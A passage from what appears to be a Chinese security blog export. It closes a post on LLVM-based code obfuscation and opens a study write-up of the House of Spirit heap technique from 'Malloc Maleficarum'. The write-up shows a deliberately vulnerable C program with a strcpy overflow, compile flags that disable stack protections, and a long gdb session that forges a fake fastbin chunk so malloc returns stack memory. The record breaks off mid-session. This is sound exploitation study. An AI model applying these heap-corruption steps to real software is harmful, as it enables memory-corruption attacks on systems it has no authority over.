<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ clang example.o -o example </span><br><span class="line">$ file example</span><br><span class="line">example: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;ld-linux-x86-64.so.2, for GNU&#x2F;Linux 2.6.32, not stripped</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>反汇编看一下main的逻辑：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000400580 &lt;main&gt;:</span><br><span class="line">  400580:	55                   	push   rbp</span><br><span class="line">  400581:	48 89 e5             	mov    rbp,rsp</span><br><span class="line">  400584:	48 83 ec 20          	sub    rsp,0x20</span><br><span class="line">  400588:	48 b8 74 06 40 00 00 	movabs rax,0x400674</span><br><span class="line">  40058f:	00 00 00 </span><br><span class="line">  400592:	48 8d 4d ec          	lea    rcx,[rbp-0x14]</span><br><span class="line">  400596:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0</span><br><span class="line">  40059d:	89 7d f8             	mov    DWORD PTR [rbp-0x8],edi</span><br><span class="line">  4005a0:	48 89 75 f0          	mov    QWORD PTR [rbp-0x10],rsi</span><br><span class="line">  4005a4:	48 89 c7             	mov    rdi,rax</span><br><span class="line">  4005a7:	48 89 ce             	mov    rsi,rcx</span><br><span class="line">  4005aa:	b0 00                	mov    al,0x0</span><br><span class="line">  4005ac:	e8 af fe ff ff       	call   400460 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">  4005b1:	48 bf 77 06 40 00 00 	movabs rdi,0x400677</span><br><span class="line">  4005b8:	00 00 00 </span><br><span class="line">  4005bb:	31 d2                	xor    edx,edx</span><br><span class="line">  4005bd:	44 8b 45 ec          	mov    r8d,DWORD PTR [rbp-0x14]</span><br><span class="line">  4005c1:	83 ea 02             	sub    edx,0x2</span><br><span class="line">  4005c4:	41 29 d0             	sub    r8d,edx &#x2F;&#x2F;已经被替换了</span><br><span class="line">  4005c7:	44 89 c6             	mov    esi,r8d</span><br><span class="line">  4005ca:	89 45 e8             	mov    DWORD PTR [rbp-0x18],eax</span><br><span class="line">  4005cd:	b0 00                	mov    al,0x0</span><br><span class="line">  4005cf:	e8 6c fe ff ff       	call   400440 &lt;printf@plt&gt;</span><br><span class="line">  4005d4:	31 d2                	xor    edx,edx</span><br><span class="line">  4005d6:	89 45 e4             	mov    DWORD PTR [rbp-0x1c],eax</span><br><span class="line">  4005d9:	89 d0                	mov    eax,edx</span><br><span class="line">  4005db:	48 83 c4 20          	add    rsp,0x20</span><br><span class="line">  4005df:	5d                   	pop    rbp</span><br><span class="line">  4005e0:	c3                   	ret    </span><br><span class="line">  4005e1:	66 2e 0f 1f 84 00 00 	nop    WORD PTR cs:[rax+rax*1+0x0]</span><br><span class="line">  4005e8:	00 00 00 </span><br><span class="line">  4005eb:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这个只是demo而已，几乎没什么强度。</p>
<h4 id="0x4-参考和引用"><a href="#0x4-参考和引用" class="headerlink" title="0x4. 参考和引用"></a>0x4. 参考和引用</h4><p><a href="http://llvm.org/">llvm</a><br><a href="http://zke1ev3n.me/2016/01/18/%E5%9F%BA%E4%BA%8ELLVM%E7%9A%84%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/">基于LLVM的代码混淆</a><br><a href="http://www.cs.cornell.edu/~asampson/blog/llvm.html">LLVM for Grad Students</a></p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>LLVM</tag>
      </tags>
  </entry>
  <entry>
    <title>Malloc-Maleficarum-复盘</title>
    <url>/2016/09/16/Malloc-Maleficarum-%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="1-HOS"><a href="#1-HOS" class="headerlink" title="1.HOS"></a>1.HOS</h4><p>伪造堆块，最终malloc()分配到栈上的空间。</p>
<a id="more"></a>
<p>这份源码来自<a href="https://gbmaster.wordpress.com/2015/07/21/x86-exploitation-101-house-of-spirit-friendly-stack-overflow/">这里</a><br>但是我这边复现他这个有点问题，原因应该是gcc版本的问题，只是为了搞明白原理，直接gdb里暴力set value就可以了。<br>这里附上gdb的调试过程。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># muhe @ ubuntu in ~&#x2F;Desktop&#x2F;study [2:54:31] </span><br><span class="line">$ ls</span><br><span class="line">hos  hos.c</span><br><span class="line"># muhe @ ubuntu in ~&#x2F;Desktop&#x2F;study [2:54:33] </span><br><span class="line">$ cat hos.c </span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">void fvuln(char *str1, int age)</span><br><span class="line">&#123;</span><br><span class="line">  char *ptr1;</span><br><span class="line">  int local_age;</span><br><span class="line">  char name[32];</span><br><span class="line">  char *ptr2;</span><br><span class="line">  local_age &#x3D; age;</span><br><span class="line">  ptr1 &#x3D; (char *) malloc(256);</span><br><span class="line">  printf(&quot;\nPTR1 &#x3D; [ %p ]&quot;, ptr1);</span><br><span class="line">  strcpy(name, str1);</span><br><span class="line">  printf(&quot;\nPTR1 &#x3D; [ %p ]\n&quot;, ptr1);</span><br><span class="line">  free(ptr1);</span><br><span class="line">  ptr2 &#x3D; (char *) malloc(40);</span><br><span class="line">  snprintf(ptr2, 40-1, &quot;%s is %d years old&quot;, name, local_age);</span><br><span class="line">  printf(&quot;\n%s\n&quot;, ptr2);</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">  int pad[10] &#x3D; &#123;0, 0, 0, 0, 0, 0, 0, 10, 0, 0&#125;;</span><br><span class="line">  if (argc &#x3D;&#x3D; 3)</span><br><span class="line">    fvuln(argv[1], atoi(argv[2]));</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># muhe @ ubuntu in ~&#x2F;Desktop&#x2F;study [2:54:35] </span><br><span class="line">$ gcc hos.c -m32 -fno-stack-protector -mpreferred-stack-boundary&#x3D;2 -mno-accumulate-outgoing-args -z execstack -o hos -g</span><br><span class="line"># muhe @ ubuntu in ~&#x2F;Desktop&#x2F;study [2:54:45] </span><br><span class="line">$ gdb .&#x2F;hos -q</span><br><span class="line">Reading symbols from .&#x2F;hos...done.</span><br><span class="line">gdb-peda$ pdisass fvuln</span><br><span class="line">Dump of assembler code for function fvuln:</span><br><span class="line">   0x080484fb &lt;+0&gt;:	push   ebp</span><br><span class="line">   0x080484fc &lt;+1&gt;:	mov    ebp,esp</span><br><span class="line">   0x080484fe &lt;+3&gt;:	sub    esp,0x2c</span><br><span class="line">   0x08048501 &lt;+6&gt;:	mov    eax,DWORD PTR [ebp+0xc]</span><br><span class="line">   0x08048504 &lt;+9&gt;:	mov    DWORD PTR [ebp-0x4],eax</span><br><span class="line">   0x08048507 &lt;+12&gt;:	push   0x100</span><br><span class="line">   0x0804850c &lt;+17&gt;:	call   0x80483b0 &lt;malloc@plt&gt;</span><br><span class="line">   0x08048511 &lt;+22&gt;:	add    esp,0x4</span><br><span class="line">   0x08048514 &lt;+25&gt;:	mov    DWORD PTR [ebp-0x8],eax</span><br><span class="line">   0x08048517 &lt;+28&gt;:	push   DWORD PTR [ebp-0x8]</span><br><span class="line">   0x0804851a &lt;+31&gt;:	push   0x8048660</span><br><span class="line">   0x0804851f &lt;+36&gt;:	call   0x8048380 &lt;printf@plt&gt;</span><br><span class="line">   0x08048524 &lt;+41&gt;:	add    esp,0x8</span><br><span class="line">   0x08048527 &lt;+44&gt;:	push   DWORD PTR [ebp+0x8]</span><br><span class="line">   0x0804852a &lt;+47&gt;:	lea    eax,[ebp-0x2c]</span><br><span class="line">   0x0804852d &lt;+50&gt;:	push   eax</span><br><span class="line">   0x0804852e &lt;+51&gt;:	call   0x80483a0 &lt;strcpy@plt&gt;</span><br><span class="line">   0x08048533 &lt;+56&gt;:	add    esp,0x8</span><br><span class="line">   0x08048536 &lt;+59&gt;:	push   DWORD PTR [ebp-0x8]</span><br><span class="line">   0x08048539 &lt;+62&gt;:	push   0x804866f</span><br><span class="line">   0x0804853e &lt;+67&gt;:	call   0x8048380 &lt;printf@plt&gt;</span><br><span class="line">   0x08048543 &lt;+72&gt;:	add    esp,0x8</span><br><span class="line">   0x08048546 &lt;+75&gt;:	push   DWORD PTR [ebp-0x8]</span><br><span class="line">   0x08048549 &lt;+78&gt;:	call   0x8048390 &lt;free@plt&gt;</span><br><span class="line">   0x0804854e &lt;+83&gt;:	add    esp,0x4</span><br><span class="line">   0x08048551 &lt;+86&gt;:	push   0x28</span><br><span class="line">   0x08048553 &lt;+88&gt;:	call   0x80483b0 &lt;malloc@plt&gt;</span><br><span class="line">   0x08048558 &lt;+93&gt;:	add    esp,0x4</span><br><span class="line">   0x0804855b &lt;+96&gt;:	mov    DWORD PTR [ebp-0xc],eax</span><br><span class="line">   0x0804855e &lt;+99&gt;:	push   DWORD PTR [ebp-0x4]</span><br><span class="line">   0x08048561 &lt;+102&gt;:	lea    eax,[ebp-0x2c]</span><br><span class="line">   0x08048564 &lt;+105&gt;:	push   eax</span><br><span class="line">   0x08048565 &lt;+106&gt;:	push   0x804867f</span><br><span class="line">   0x0804856a &lt;+111&gt;:	push   0x27</span><br><span class="line">   0x0804856c &lt;+113&gt;:	push   DWORD PTR [ebp-0xc]</span><br><span class="line">   0x0804856f &lt;+116&gt;:	call   0x80483d0 &lt;snprintf@plt&gt;</span><br><span class="line">   0x08048574 &lt;+121&gt;:	add    esp,0x14</span><br><span class="line">   0x08048577 &lt;+124&gt;:	push   DWORD PTR [ebp-0xc]</span><br><span class="line">   0x0804857a &lt;+127&gt;:	push   0x8048692</span><br><span class="line">   0x0804857f &lt;+132&gt;:	call   0x8048380 &lt;printf@plt&gt;</span><br><span class="line">   0x08048584 &lt;+137&gt;:	add    esp,0x8</span><br><span class="line">   0x08048587 &lt;+140&gt;:	nop</span><br><span class="line">   0x08048588 &lt;+141&gt;:	leave  </span><br><span class="line">   0x08048589 &lt;+142&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line">gdb-peda$ b *0x0804850c</span><br><span class="line">Breakpoint 1 at 0x804850c: file hos.c, line 14.</span><br><span class="line">gdb-peda$ b *0x0804852e</span><br><span class="line">Breakpoint 2 at 0x804852e: file hos.c, line 16.</span><br><span class="line">gdb-peda$ b *0x08048549</span><br><span class="line">Breakpoint 3 at 0x8048549: file hos.c, line 19.</span><br><span class="line">gdb-peda$ b *0x08048553</span><br><span class="line">Breakpoint 4 at 0x8048553: file hos.c, line 21.</span><br><span class="line">gdb-peda$ r aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbcccc 20</span><br><span class="line">Starting program: &#x2F;home&#x2F;muhe&#x2F;Desktop&#x2F;study&#x2F;hos aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbcccc 20</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> [----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x14 </span><br><span class="line">EBX: 0x0 </span><br><span class="line">ECX: 0x0 </span><br><span class="line">EDX: 0x14 </span><br><span class="line">ESI: 0xf7fb9000 --&gt; 0x1aedb0 </span><br><span class="line">EDI: 0xffffd584 --&gt; 0xf7fb9000 --&gt; 0x1aedb0 </span><br><span class="line">EBP: 0xffffd54c --&gt; 0xffffd588 --&gt; 0x0 </span><br><span class="line">ESP: 0xffffd51c --&gt; 0x100 </span><br><span class="line">EIP: 0x804850c (&lt;fvuln+17&gt;:	call   0x80483b0 &lt;malloc@plt&gt;)</span><br><span class="line">EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x8048501 &lt;fvuln+6&gt;:	mov    eax,DWORD PTR [ebp+0xc]</span><br><span class="line">   0x8048504 &lt;fvuln+9&gt;:	mov    DWORD PTR [ebp-0x4],eax</span><br><span class="line">   0x8048507 &lt;fvuln+12&gt;:	push   0x100</span><br><span class="line">&#x3D;&gt; 0x804850c &lt;fvuln+17&gt;:	call   0x80483b0 &lt;malloc@plt&gt;</span><br><span class="line">   0x8048511 &lt;fvuln+22&gt;:	add    esp,0x4</span><br><span class="line">   0x8048514 &lt;fvuln+25&gt;:	mov    DWORD PTR [ebp-0x8],eax</span><br><span class="line">   0x8048517 &lt;fvuln+28&gt;:	push   DWORD PTR [ebp-0x8]</span><br><span class="line">   0x804851a &lt;fvuln+31&gt;:	push   0x8048660</span><br><span class="line">Guessed arguments:</span><br><span class="line">arg[0]: 0x100 </span><br><span class="line">arg[1]: 0x0 </span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd51c --&gt; 0x100 </span><br><span class="line">0004| 0xffffd520 --&gt; 0x0 </span><br><span class="line">0008| 0xffffd524 --&gt; 0xffffd5c4 --&gt; 0x61b64d7e </span><br><span class="line">0012| 0xffffd528 --&gt; 0xf7fe76db (add    esi,0x15925)</span><br><span class="line">0016| 0xffffd52c --&gt; 0x0 </span><br><span class="line">0020| 0xffffd530 --&gt; 0xf7e39c45 (&lt;strtol+5&gt;:	add    eax,0x17f3bb)</span><br><span class="line">0024| 0xffffd534 --&gt; 0xf7e37040 (&lt;atoi+16&gt;:	add    esp,0x1c)</span><br><span class="line">0028| 0xffffd538 --&gt; 0xffffd851 --&gt; 0x58003032 (&#39;20&#39;)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Breakpoint 1, 0x0804850c in fvuln (str1&#x3D;0xffffd828 &#39;a&#39; &lt;repeats 32 times&gt;, &quot;bbbbcccc&quot;, age&#x3D;0x14) at hos.c:14</span><br><span class="line">14	  ptr1 &#x3D; (char *) malloc(256);</span><br><span class="line">gdb-peda$ c</span><br><span class="line">Continuing.</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0xffffd520 --&gt; 0x0 </span><br><span class="line">EBX: 0x0 </span><br><span class="line">ECX: 0x7fffffec </span><br><span class="line">EDX: 0xf7fba870 --&gt; 0x0 </span><br><span class="line">ESI: 0xf7fb9000 --&gt; 0x1aedb0 </span><br><span class="line">EDI: 0xffffd584 --&gt; 0xf7fb9000 --&gt; 0x1aedb0 </span><br><span class="line">EBP: 0xffffd54c --&gt; 0xffffd588 --&gt; 0x0 </span><br><span class="line">ESP: 0xffffd518 --&gt; 0xffffd520 --&gt; 0x0 </span><br><span class="line">EIP: 0x804852e (&lt;fvuln+51&gt;:	call   0x80483a0 &lt;strcpy@plt&gt;)</span><br><span class="line">EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x8048527 &lt;fvuln+44&gt;:	push   DWORD PTR [ebp+0x8]</span><br><span class="line">   0x804852a &lt;fvuln+47&gt;:	lea    eax,[ebp-0x2c]</span><br><span class="line">   0x804852d &lt;fvuln+50&gt;:	push   eax</span><br><span class="line">&#x3D;&gt; 0x804852e &lt;fvuln+51&gt;:	call   0x80483a0 &lt;strcpy@plt&gt;</span><br><span class="line">   0x8048533 &lt;fvuln+56&gt;:	add    esp,0x8</span><br><span class="line">   0x8048536 &lt;fvuln+59&gt;:	push   DWORD PTR [ebp-0x8]</span><br><span class="line">   0x8048539 &lt;fvuln+62&gt;:	push   0x804866f</span><br><span class="line">   0x804853e &lt;fvuln+67&gt;:	call   0x8048380 &lt;printf@plt&gt;</span><br><span class="line">Guessed arguments:</span><br><span class="line">arg[0]: 0xffffd520 --&gt; 0x0 </span><br><span class="line">arg[1]: 0xffffd828 (&#39;a&#39; &lt;repeats 32 times&gt;, &quot;bbbbcccc&quot;)</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd518 --&gt; 0xffffd520 --&gt; 0x0 </span><br><span class="line">0004| 0xffffd51c --&gt; 0xffffd828 (&#39;a&#39; &lt;repeats 32 times&gt;, &quot;bbbbcccc&quot;)</span><br><span class="line">0008| 0xffffd520 --&gt; 0x0 </span><br><span class="line">0012| 0xffffd524 --&gt; 0xffffd5c4 --&gt; 0x61b64d7e </span><br><span class="line">0016| 0xffffd528 --&gt; 0xf7fe76db (add    esi,0x15925)</span><br><span class="line">0020| 0xffffd52c --&gt; 0x0 </span><br><span class="line">0024| 0xffffd530 --&gt; 0xf7e39c45 (&lt;strtol+5&gt;:	add    eax,0x17f3bb)</span><br><span class="line">0028| 0xffffd534 --&gt; 0xf7e37040 (&lt;atoi+16&gt;:	add    esp,0x1c)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Breakpoint 2, 0x0804852e in fvuln (str1&#x3D;0xffffd828 &#39;a&#39; &lt;repeats 32 times&gt;, &quot;bbbbcccc&quot;, age&#x3D;0x14) at hos.c:16</span><br><span class="line">16	  strcpy(name, str1);</span><br><span class="line">gdb-peda$ c</span><br><span class="line">Continuing.</span><br><span class="line">PTR1 &#x3D; [ 0x804b008 ]</span><br><span class="line">PTR1 &#x3D; [ 0x63636363 ]</span><br></pre></td></tr></table></figure>
<p>这里伪造堆块，但是为了过malloc()对fastbin的check，所以需要再设置下下一个块。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> [----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x17 </span><br><span class="line">EBX: 0x0 </span><br><span class="line">ECX: 0x7fffffeb </span><br><span class="line">EDX: 0xf7fba870 --&gt; 0x0 </span><br><span class="line">ESI: 0xf7fb9000 --&gt; 0x1aedb0 </span><br><span class="line">EDI: 0xffffd584 --&gt; 0xf7fb9000 --&gt; 0x1aedb0 </span><br><span class="line">EBP: 0xffffd54c --&gt; 0xffffd588 --&gt; 0x0 </span><br><span class="line">ESP: 0xffffd51c (&quot;cccc&quot;, &#39;a&#39; &lt;repeats 32 times&gt;, &quot;bbbbcccc&quot;)</span><br><span class="line">EIP: 0x8048549 (&lt;fvuln+78&gt;:	call   0x8048390 &lt;free@plt&gt;)</span><br><span class="line">EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x804853e &lt;fvuln+67&gt;:	call   0x8048380 &lt;printf@plt&gt;</span><br><span class="line">   0x8048543 &lt;fvuln+72&gt;:	add    esp,0x8</span><br><span class="line">   0x8048546 &lt;fvuln+75&gt;:	push   DWORD PTR [ebp-0x8]</span><br><span class="line">&#x3D;&gt; 0x8048549 &lt;fvuln+78&gt;:	call   0x8048390 &lt;free@plt&gt;</span><br><span class="line">   0x804854e &lt;fvuln+83&gt;:	add    esp,0x4</span><br><span class="line">   0x8048551 &lt;fvuln+86&gt;:	push   0x28</span><br><span class="line">   0x8048553 &lt;fvuln+88&gt;:	call   0x80483b0 &lt;malloc@plt&gt;</span><br><span class="line">   0x8048558 &lt;fvuln+93&gt;:	add    esp,0x4</span><br><span class="line">Guessed arguments:</span><br><span class="line">arg[0]: 0x63636363 (&#39;cccc&#39;)</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd51c (&quot;cccc&quot;, &#39;a&#39; &lt;repeats 32 times&gt;, &quot;bbbbcccc&quot;)</span><br><span class="line">0004| 0xffffd520 (&#39;a&#39; &lt;repeats 32 times&gt;, &quot;bbbbcccc&quot;)</span><br><span class="line">0008| 0xffffd524 (&#39;a&#39; &lt;repeats 28 times&gt;, &quot;bbbbcccc&quot;)</span><br><span class="line">0012| 0xffffd528 (&#39;a&#39; &lt;repeats 24 times&gt;, &quot;bbbbcccc&quot;)</span><br><span class="line">0016| 0xffffd52c (&#39;a&#39; &lt;repeats 20 times&gt;, &quot;bbbbcccc&quot;)</span><br><span class="line">0020| 0xffffd530 (&#39;a&#39; &lt;repeats 16 times&gt;, &quot;bbbbcccc&quot;)</span><br><span class="line">0024| 0xffffd534 (&#39;a&#39; &lt;repeats 12 times&gt;, &quot;bbbbcccc&quot;)</span><br><span class="line">0028| 0xffffd538 (&quot;aaaaaaaabbbbcccc&quot;)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Breakpoint 3, 0x08048549 in fvuln (str1&#x3D;0xffffd828 &#39;a&#39; &lt;repeats 32 times&gt;, &quot;bbbbcccc&quot;, age&#x3D;0x14) at hos.c:19</span><br><span class="line">19	  free(ptr1);</span><br><span class="line">gdb-peda$ x&#x2F;10wx $esp</span><br><span class="line">0xffffd51c:	0x63636363	0x61616161	0x61616161	0x61616161</span><br><span class="line">0xffffd52c:	0x61616161	0x61616161	0x61616161	0x61616161</span><br><span class="line">0xffffd53c:	0x61616161	0x62626262</span><br><span class="line">gdb-peda$ set *(int*)0xffffd51c &#x3D; 0xffffd530</span><br><span class="line">gdb-peda$ x&#x2F;10wx 0xffffd530 - 8</span><br><span class="line">0xffffd528:	0x61616161	0x61616161	0x61616161	0x61616161</span><br><span class="line">0xffffd538:	0x61616161	0x61616161	0x62626262	0x63636363</span><br><span class="line">0xffffd548:	0x00000000	0xffffd588</span><br><span class="line">gdb-peda$ set *(int*)0xffffd528&#x3D;0x0</span><br><span class="line">gdb-peda$ set *(int*)0xffffd52c&#x3D;0x31</span><br><span class="line">gdb-peda$ x&#x2F;10wx 0xffffd530 - 8 + 0x30</span><br><span class="line">0xffffd558:	0x00000014	0x00000000	0x00000000	0x00000000</span><br><span class="line">0xffffd568:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0xffffd578:	0x0000000a	0x00000000</span><br><span class="line">gdb-peda$ set *(int*)0xffffd558 &#x3D; 0x31</span><br><span class="line">gdb-peda$ set *(int*)0xffffd55c &#x3D; 0x30</span><br><span class="line">gdb-peda$ ni</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> [----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x0 </span><br><span class="line">EBX: 0x0 </span><br><span class="line">ECX: 0xf7fb9000 --&gt; 0x1aedb0 </span><br><span class="line">EDX: 0x0 </span><br><span class="line">ESI: 0xf7fb9000 --&gt; 0x1aedb0 </span><br><span class="line">EDI: 0xffffd584 --&gt; 0xf7fb9000 --&gt; 0x1aedb0 </span><br><span class="line">EBP: 0xffffd54c --&gt; 0xffffd588 --&gt; 0x0 </span><br><span class="line">ESP: 0xffffd51c --&gt; 0xffffd530 --&gt; 0x0 </span><br><span class="line">EIP: 0x804854e (&lt;fvuln+83&gt;:	add    esp,0x4)</span><br><span class="line">EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x8048543 &lt;fvuln+72&gt;:	add    esp,0x8</span><br><span class="line">   0x8048546 &lt;fvuln+75&gt;:	push   DWORD PTR [ebp-0x8]</span><br><span class="line">   0x8048549 &lt;fvuln+78&gt;:	call   0x8048390 &lt;free@plt&gt;</span><br><span class="line">&#x3D;&gt; 0x804854e &lt;fvuln+83&gt;:	add    esp,0x4</span><br><span class="line">   0x8048551 &lt;fvuln+86&gt;:	push   0x28</span><br><span class="line">   0x8048553 &lt;fvuln+88&gt;:	call   0x80483b0 &lt;malloc@plt&gt;</span><br><span class="line">   0x8048558 &lt;fvuln+93&gt;:	add    esp,0x4</span><br><span class="line">   0x804855b &lt;fvuln+96&gt;:	mov    DWORD PTR [ebp-0xc],eax</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd51c --&gt; 0xffffd530 --&gt; 0x0 </span><br><span class="line">0004| 0xffffd520 (&quot;aaaaaaaa&quot;)</span><br><span class="line">0008| 0xffffd524 (&quot;aaaa&quot;)</span><br><span class="line">0012| 0xffffd528 --&gt; 0x0 </span><br><span class="line">0016| 0xffffd52c --&gt; 0x31 (&#39;1&#39;)</span><br><span class="line">0020| 0xffffd530 --&gt; 0x0 </span><br><span class="line">0024| 0xffffd534 (&#39;a&#39; &lt;repeats 12 times&gt;, &quot;bbbbcccc&quot;)</span><br><span class="line">0028| 0xffffd538 (&quot;aaaaaaaabbbbcccc&quot;)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x0804854e	19	  free(ptr1);</span><br><span class="line">gdb-peda$ ni</span><br><span class="line"> [----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x0 </span><br><span class="line">EBX: 0x0 </span><br><span class="line">ECX: 0xf7fb9000 --&gt; 0x1aedb0 </span><br><span class="line">EDX: 0x0 </span><br><span class="line">ESI: 0xf7fb9000 --&gt; 0x1aedb0 </span><br><span class="line">EDI: 0xffffd584 --&gt; 0xf7fb9000 --&gt; 0x1aedb0 </span><br><span class="line">EBP: 0xffffd54c --&gt; 0xffffd588 --&gt; 0x0 </span><br><span class="line">ESP: 0xffffd520 (&quot;aaaaaaaa&quot;)</span><br><span class="line">EIP: 0x8048551 (&lt;fvuln+86&gt;:	push   0x28)</span><br><span class="line">EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x8048546 &lt;fvuln+75&gt;:	push   DWORD PTR [ebp-0x8]</span><br><span class="line">   0x8048549 &lt;fvuln+78&gt;:	call   0x8048390 &lt;free@plt&gt;</span><br><span class="line">   0x804854e &lt;fvuln+83&gt;:	add    esp,0x4</span><br><span class="line">&#x3D;&gt; 0x8048551 &lt;fvuln+86&gt;:	push   0x28</span><br><span class="line">   0x8048553 &lt;fvuln+88&gt;:	call   0x80483b0 &lt;malloc@plt&gt;</span><br><span class="line">   0x8048558 &lt;fvuln+93&gt;:	add    esp,0x4</span><br><span class="line">   0x804855b &lt;fvuln+96&gt;:	mov    DWORD PTR [ebp-0xc],eax</span><br><span class="line">   0x804855e &lt;fvuln+99&gt;:	push   DWORD PTR [ebp-0x4]</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd520 (&quot;aaaaaaaa&quot;)</span><br><span class="line">0004| 0xffffd524 (&quot;aaaa&quot;)</span><br><span class="line">0008| 0xffffd528 --&gt; 0x0 </span><br><span class="line">0012| 0xffffd52c --&gt; 0x31 (&#39;1&#39;)</span><br><span class="line">0016| 0xffffd530 --&gt; 0x0 </span><br><span class="line">0020| 0xffffd534 (&#39;a&#39; &lt;repeats 12 times&gt;, &quot;bbbbcccc&quot;)</span><br><span class="line">0024| 0xffffd538 (&quot;aaaaaaaabbbbcccc&quot;)</span><br><span class="line">0028| 0xffffd53c (&quot;aaaabbbbcccc&quot;)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">21	  ptr2 &#x3D; (char *) malloc(40);</span><br><span class="line">gdb-peda$ ni</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x0 </span><br><span class="line">EBX: 0x0 </span><br><span class="line">ECX: 0xf7fb9000 --&gt; 0x1aedb0 </span><br><span class="line">EDX: 0x0 </span><br><span class="line">ESI: 0xf7fb9000 --&gt; 0x1aedb0 </span><br><span class="line">EDI: 0xffffd584 --&gt; 0xf7fb9000 --&gt; 0x1aedb0 </span><br><span class="line">EBP: 0xffffd54c --&gt; 0xffffd588 --&gt; 0x0 </span><br><span class="line">ESP: 0xffffd51c --&gt; 0x28 (&#39;(&#39;)</span><br><span class="line">EIP: 0x8048553 (&lt;fvuln+88&gt;:	call   0x80483b0 &lt;malloc@plt&gt;)</span><br><span class="line">EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x8048549 &lt;fvuln+78&gt;:	call   0x8048390 &lt;free@plt&gt;</span><br><span class="line">   0x804854e &lt;fvuln+83&gt;:	add    esp,0x4</span><br><span class="line">   0x8048551 &lt;fvuln+86&gt;:	push   0x28</span><br><span class="line">&#x3D;&gt; 0x8048553 &lt;fvuln+88&gt;:	call   0x80483b0 &lt;malloc@plt&gt;</span><br><span class="line">   0x8048558 &lt;fvuln+93&gt;:	add    esp,0x4</span><br><span class="line">   0x804855b &lt;fvuln+96&gt;:	mov    DWORD PTR [ebp-0xc],eax</span><br><span class="line">   0x804855e &lt;fvuln+99&gt;:	push   DWORD PTR [ebp-0x4]</span><br><span class="line">   0x8048561 &lt;fvuln+102&gt;:	lea    eax,[ebp-0x2c]</span><br><span class="line">Guessed arguments:</span><br><span class="line">arg[0]: 0x28 (&#39;(&#39;)</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd51c --&gt; 0x28 (&#39;(&#39;)</span><br><span class="line">0004| 0xffffd520 (&quot;aaaaaaaa&quot;)</span><br><span class="line">0008| 0xffffd524 (&quot;aaaa&quot;)</span><br><span class="line">0012| 0xffffd528 --&gt; 0x0 </span><br><span class="line">0016| 0xffffd52c --&gt; 0x31 (&#39;1&#39;)</span><br><span class="line">0020| 0xffffd530 --&gt; 0x0 </span><br><span class="line">0024| 0xffffd534 (&#39;a&#39; &lt;repeats 12 times&gt;, 